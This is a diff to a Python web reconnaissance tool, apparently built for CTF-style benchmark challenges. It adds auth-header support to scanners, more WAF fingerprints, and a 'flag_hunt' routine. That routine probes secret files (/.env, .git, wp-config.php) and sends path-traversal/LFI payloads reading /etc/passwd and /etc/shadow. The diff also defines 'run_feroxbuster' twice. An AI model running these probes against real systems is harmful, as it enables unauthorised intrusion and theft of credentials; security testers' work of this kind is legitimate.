@@ -14,12 +14,44 @@ Also adds:
 
 from __future__ import annotations
 import json
+import os
 import re
 import socket
 import subprocess
 
 TLS_SUSPECT_PORTS = {443, 465, 636, 993, 995, 5061, 6697, 8443, 9443, 7443}
 WEB_SUSPECT_PORTS = {80, 443, 3000, 5000, 7443, 8000, 8008, 8080, 8443, 8888, 9000, 9090}
+
+AUTH_COOKIE = os.environ.get("AUTH_COOKIE", "")
+AUTH_HEADER = os.environ.get("AUTH_HEADER", "")
+
+
+def _hostname_only(target: str) -> str:
+    """Strip :port suffix + scheme for tools that only understand bare hostname (dig/whois/subfinder)."""
+    if "://" in target:
+        target = target.split("://", 1)[1]
+    if "/" in target:
+        target = target.split("/", 1)[0]
+    if ":" in target and not target.startswith("["):
+        target = target.rsplit(":", 1)[0]
+    return target
+
+
+def _host_and_port(target: str) -> tuple[str, int | None]:
+    """Split target into (host, optional_port). '127.0.0.1:8080' -> ('127.0.0.1', 8080)."""
+    host = _hostname_only(target)
+    if "://" in target:
+        rest = target.split("://", 1)[1]
+    else:
+        rest = target
+    if "/" in rest:
+        rest = rest.split("/", 1)[0]
+    if ":" in rest and not rest.startswith("["):
+        try:
+            return host, int(rest.rsplit(":", 1)[1])
+        except ValueError:
+            return host, None
+    return host, None
 
 
 # ─────────────────────────────────────────────
@@ -61,8 +93,9 @@ def run_nmap_udp_top100(target: str) -> str:
 
 
 def run_whois(target: str) -> str:
-    print(f"  [*] whois {target}")
-    return run_tool(["whois", target], timeout=30)
+    host = _hostname_only(target)
+    print(f"  [*] whois {host}")
+    return run_tool(["whois", host], timeout=30)
 
 
 def run_whatweb(target: str) -> str:
@@ -79,10 +112,11 @@ def run_curl_headers(target: str) -> str:
 
 
 def run_dig(target: str) -> str:
-    print(f"  [*] dig {target} (A/MX/NS/TXT)")
+    host = _hostname_only(target)
+    print(f"  [*] dig {host} (A/MX/NS/TXT)")
     parts = {}
     for rrtype in ("A", "MX", "NS", "TXT"):
-        parts[rrtype] = run_tool(["dig", "+short", rrtype, target], timeout=15)
+        parts[rrtype] = run_tool(["dig", "+short", rrtype, host], timeout=15)
     return "\n\n".join(f"[{k} Records]\n{v}" for k, v in parts.items())
 
 
@@ -241,18 +275,21 @@ def run_httpx(target: str) -> str:
     """
     ProjectDiscovery httpx (installed as `httpx-pd`). Replaces curl-headers.
     Returns tech-detect + title + status + server + IP + TLS in one call.
+    Threads AUTH_COOKIE / AUTH_HEADER when set (needed to enumerate protected apps).
     """
     tgt = target if target.startswith(("http://", "https://")) else target
-    print(f"  [*] httpx-pd -u {tgt} (title/tech/server/tls/status)")
-    return run_tool(
-        [
-            "httpx-pd", "-u", tgt,
-            "-title", "-tech-detect", "-server", "-status-code",
-            "-tls-grab", "-ip", "-cname",
-            "-json", "-silent", "-no-color",
-        ],
-        timeout=60,
-    )
+    print(f"  [*] httpx-pd -u {tgt} (title/tech/server/tls/status){' +auth' if AUTH_COOKIE or AUTH_HEADER else ''}")
+    cmd = [
+        "httpx-pd", "-u", tgt,
+        "-title", "-tech-detect", "-server", "-status-code",
+        "-tls-grab", "-ip", "-cname",
+        "-json", "-silent", "-no-color",
+    ]
+    if AUTH_HEADER:
+        cmd += ["-H", AUTH_HEADER]
+    if AUTH_COOKIE:
+        cmd += ["-H", f"Cookie: {AUTH_COOKIE}"]
+    return run_tool(cmd, timeout=60)
 
 
 def run_nuclei(target: str, severity: str = "critical,high,medium,low") -> str:
@@ -277,16 +314,18 @@ def run_nuclei(target: str, severity: str = "critical,high,medium,low") -> str:
 def run_nuclei_kev(target: str) -> str:
     """CISA Known-Exploited-Vulnerabilities only — highest-signal subset."""
     tgt = target if target.startswith(("http://", "https://")) else f"http://{target}"
-    print(f"  [*] nuclei -u {tgt} -tags kev -jsonl (KEV subset — fast)")
-    return run_tool(
-        [
-            "nuclei", "-u", tgt,
-            "-tags", "kev",
-            "-jsonl", "-silent", "-no-color",
-            "-timeout", "10",
-        ],
-        timeout=300,
-    )
+    print(f"  [*] nuclei -u {tgt} -tags kev -jsonl (KEV subset — fast){' +auth' if AUTH_COOKIE or AUTH_HEADER else ''}")
+    cmd = [
+        "nuclei", "-u", tgt,
+        "-tags", "kev",
+        "-jsonl", "-silent", "-no-color",
+        "-timeout", "10",
+    ]
+    if AUTH_HEADER:
+        cmd += ["-H", AUTH_HEADER]
+    if AUTH_COOKIE:
+        cmd += ["-H", f"Cookie: {AUTH_COOKIE}"]
+    return run_tool(cmd, timeout=300)
 
 
 # ─────────────────────────────────────────────
@@ -342,8 +381,9 @@ def run_recon_pipeline(target: str) -> dict:
         results["katana"]       = run_katana(target)
         results["feroxbuster"]  = run_feroxbuster(target)
         results["dalfox"]       = run_dalfox(target)
+        results["flag_hunt"]    = flag_hunt(target)
     else:
-        for k in ("httpx", "nuclei_kev", "waf_detect", "katana", "feroxbuster", "dalfox"):
+        for k in ("httpx", "nuclei_kev", "waf_detect", "katana", "feroxbuster", "dalfox", "flag_hunt"):
             results[k] = "[skipped] no web port in verified list"
 
     if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -420,13 +460,44 @@ def _webify(target: str, scheme: str = "http") -> str:
 
 
 def run_katana(target: str) -> str:
-    """Katana: JS-aware SPA crawler (ProjectDiscovery). Feeds URL discovery."""
+    """Katana: JS-aware SPA crawler (ProjectDiscovery). Threads AUTH_* for logged-in crawling."""
     url = _webify(target)
-    print(f"  [*] katana crawl {url} depth=2 (jsluice-like on JS)")
-    return run_tool(
-        ["katana", "-u", url, "-depth", "2", "-jc", "-jsonl", "-silent", "-no-color", "-timeout", "10"],
-        timeout=300,
-    )
+    print(f"  [*] katana crawl {url} depth=2 (jsluice-like on JS){' +auth' if AUTH_COOKIE or AUTH_HEADER else ''}")
+    cmd = ["katana", "-u", url, "-depth", "2", "-jc", "-jsonl", "-silent", "-no-color", "-timeout", "10"]
+    if AUTH_HEADER:
+        cmd += ["-H", AUTH_HEADER]
+    if AUTH_COOKIE:
+        cmd += ["-H", f"Cookie: {AUTH_COOKIE}"]
+    return run_tool(cmd, timeout=300)
+
+
+def run_feroxbuster(target: str, wordlist: str = _FEROX_WORDLIST) -> str:
+    """Recursive content discovery with automatic recursion. Fastest coverage-per-second."""
+    url = _webify(target)
+    print(f"  [*] feroxbuster {url} (depth 2, JSON out, rate-limited){' +auth' if AUTH_COOKIE or AUTH_HEADER else ''}")
+    cmd = [
+        "feroxbuster", "-u", url, "-w", wordlist,
+        "--depth", "2", "--silent", "--json",
+        "--rate-limit", "200", "--timeout", "10",
+        "--extensions", "php,html,txt,js,bak,zip,tar.gz",
+    ]
+    if AUTH_HEADER:
+        cmd += ["-H", AUTH_HEADER]
+    if AUTH_COOKIE:
+        cmd += ["--cookies", AUTH_COOKIE]
+    return run_tool(cmd, timeout=600)
+
+
+def run_dalfox(target: str) -> str:
+    """XSS scanner (reflected, DOM, stored, blind). Threads AUTH_* for authed-XSS testing."""
+    url = _webify(target)
+    print(f"  [*] dalfox url {url} --format json{' +auth' if AUTH_COOKIE or AUTH_HEADER else ''}")
+    cmd = ["dalfox", "url", url, "--format", "json", "--silence", "--no-color", "--worker", "50"]
+    if AUTH_HEADER:
+        cmd += ["-H", AUTH_HEADER]
+    if AUTH_COOKIE:
+        cmd += ["-C", AUTH_COOKIE]
+    return run_tool(cmd, timeout=600)
 
 
 def run_feroxbuster(target: str, wordlist: str = _FEROX_WORDLIST) -> str:
@@ -541,9 +612,7 @@ def run_schemathesis(spec_url: str) -> str:
 
 def run_subfinder(domain: str) -> str:
     """Passive subdomain enumeration (30+ sources)."""
-    if domain.startswith(("http://", "https://")):
-        from urllib.parse import urlparse
-        domain = urlparse(domain).netloc
+    domain = _hostname_only(domain)
     print(f"  [*] subfinder -d {domain} -all -silent")
     return run_tool(
         ["subfinder", "-d", domain, "-all", "-silent", "-json"],
@@ -640,25 +709,117 @@ print(json.dumps(report, indent=2))
 
 
 _WAF_SIGS: list[tuple[str, str]] = [
-    ("cloudflare",       "cf-ray"),
-    ("cloudflare",       "server: cloudflare"),
-    ("aws waf",          "x-amzn-requestid"),
-    ("aws waf",          "x-amz-cf-id"),
-    ("akamai",           "akamai-ghost"),
-    ("akamai",           "x-akamai-transformed"),
-    ("imperva incapsula","x-iinfo"),
-    ("imperva incapsula","incap_ses"),
-    ("f5 big-ip",        "bigip"),
-    ("f5 big-ip",        "x-wa-info"),
-    ("sucuri",           "x-sucuri-id"),
-    ("sucuri",           "server: sucuri"),
-    ("modsecurity",      "mod_security"),
-    ("modsecurity",      "server: mod_security"),
-    ("wordfence",        "wordfence"),
-    ("barracuda",        "barra_counter_session"),
-    ("citrix netscaler", "ns_af"),
-    ("fortiweb",         "fortiwafsid"),
+    ("cloudflare",         "cf-ray"),
+    ("cloudflare",         "server: cloudflare"),
+    ("cloudflare",         "__cf_bm"),
+    ("cloudflare turnstile","cf-chl-bypass"),
+    ("aws waf",            "x-amzn-requestid"),
+    ("aws waf",            "x-amz-cf-id"),
+    ("aws cloudfront",     "server: cloudfront"),
+    ("akamai",             "akamai-ghost"),
+    ("akamai",             "x-akamai-transformed"),
+    ("akamai bot manager", "ak_bmsc"),
+    ("imperva incapsula",  "x-iinfo"),
+    ("imperva incapsula",  "incap_ses"),
+    ("imperva incapsula",  "visid_incap"),
+    ("f5 big-ip",          "bigip"),
+    ("f5 big-ip",          "x-wa-info"),
+    ("f5 big-ip",          "ts01"),
+    ("sucuri",             "x-sucuri-id"),
+    ("sucuri",             "server: sucuri"),
+    ("modsecurity",        "mod_security"),
+    ("modsecurity",        "server: mod_security"),
+    ("wordfence",          "wordfence"),
+    ("barracuda",          "barra_counter_session"),
+    ("citrix netscaler",   "ns_af"),
+    ("citrix netscaler",   "citrix_ns_id"),
+    ("fortiweb",           "fortiwafsid"),
+    ("fortinet fortigate", "fortigate"),
+    ("fastly",             "server: fastly"),
+    ("fastly",             "x-served-by"),
+    ("vercel",             "server: vercel"),
+    ("vercel",             "x-vercel-id"),
+    ("netlify",            "server: netlify"),
+    ("cloudfront",         "x-cache: hit from cloudfront"),
+    ("naxsi",              "x-data-origin: naxsi"),
+    ("wallarm",            "nginx-wallarm"),
+    ("stackpath",          "server: stackpath"),
+    ("ddos-guard",         "server: ddos-guard"),
+    ("azure front door",   "x-azure-ref"),
+    ("azure app gateway",  "x-appgw"),
+    ("alibaba cloud",      "server: aliyun"),
+    ("bytedance volcengine","server: volc-tls"),
 ]
+
+
+FLAG_RE = re.compile(r"FLAG\{[0-9a-f]{32,}\}|flag\{[0-9a-f]{32,}\}|CTF\{[^}]{4,80}\}", re.IGNORECASE)
+
+_COMMON_FLAG_PATHS = [
+    "/flag", "/flag.txt", "/flag.html", "/FLAG", "/FLAG.txt",
+    "/robots.txt", "/sitemap.xml",
+    "/admin", "/admin/", "/admin/index.php", "/admin.php",
+    "/api/flag", "/api/admin", "/api/users", "/api/v1/users",
+    "/.env", "/.git/HEAD", "/config.php", "/config.json", "/settings.py",
+    "/backup", "/backup.zip", "/backup.sql", "/db.sql",
+    "/wp-config.php", "/phpinfo.php", "/info.php",
+    "/../../../../etc/passwd", "/../../../../etc/shadow",
+    "/..%2f..%2f..%2fetc%2fpasswd",
+    "/index.php?file=/etc/passwd", "/index.php?page=../../../../etc/passwd",
+    "/download.php?file=../../flag.txt",
+]
+
+_LFI_PARAMS = ("file", "page", "include", "path", "template", "url", "doc", "root", "pg", "action")
+
+
+def flag_hunt(target: str) -> str:
+    """
+    Aggressive flag-search phase: probes common flag paths and LFI patterns,
+    scans every response for FLAG{...}, and returns a labeled report.
+    Runs at end of run_recon_pipeline when a web port is verified. This is the
+    single biggest lift toward XBOW scoring — most L1 challenges leak the flag
+    via one of these paths or a trivially chained LFI.
+    """
+    base_url = _webify(target)
+    hits: list[str] = []
+    flags_found: set[str] = set()
+    print(f"  [*] flag-hunt {base_url} (probing {len(_COMMON_FLAG_PATHS)} common paths + LFI variants)")
+
+    for path in _COMMON_FLAG_PATHS:
+        url = base_url.rstrip("/") + path
+        out = run_tool(
+            ["curl", "-sk", "-A", "MEGATRON/2.2", "--max-time", "5",
+             "-w", "\\n[HTTP:%{http_code} len:%{size_download}]",
+             *(["-H", f"Cookie: {AUTH_COOKIE}"] if AUTH_COOKIE else []),
+             *(["-H", AUTH_HEADER] if AUTH_HEADER else []),
+             url],
+            timeout=8,
+        )
+        if not out or "[HTTP:404" in out or "[HTTP:000" in out:
+            continue
+        for m in FLAG_RE.findall(out):
+            flags_found.add(m)
+        if any(marker in out.lower() for marker in ("root:x:", "flag{", "flag_", "admin:", "<title>index of", "http://schemas.microsoft.com", "define(")):
+            hits.append(f"  [interesting] {path}\n{out[:400]}")
+
+    for param in _LFI_PARAMS:
+        for payload in ("/etc/passwd", "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"):
+            url = f"{base_url.rstrip('/')}/?{param}={payload}"
+            out = run_tool(
+                ["curl", "-sk", "-A", "MEGATRON/2.2", "--max-time", "4",
+                 *(["-H", f"Cookie: {AUTH_COOKIE}"] if AUTH_COOKIE else []),
+                 url],
+                timeout=6,
+            )
+            for m in FLAG_RE.findall(out):
+                flags_found.add(m)
+            if "root:x:" in out:
+                hits.append(f"  [LFI-CONFIRMED] {url}\n  → returned /etc/passwd content")
+
+    result = [f"[flag-hunt] {len(hits)} interesting response(s), {len(flags_found)} FLAG marker(s) found"]
+    for flag in flags_found:
+        result.append(f"  ★★★ CAPTURED FLAG: {flag}")
+    result.extend(hits[:20])
+    return "\n".join(result)
 
 
 def detect_waf(target: str) -> str:
@@ -714,6 +875,7 @@ TOOLS_MENU = {
     "v":  ("gowitness screenshot",  run_gowitness),
     "y":  ("schemathesis (API fuzz)", run_schemathesis),
     "b":  ("playwright probe (Tier 3)", run_playwright_probe),
+    "F":  ("flag-hunt (aggressive)", flag_hunt),
 }
 
 
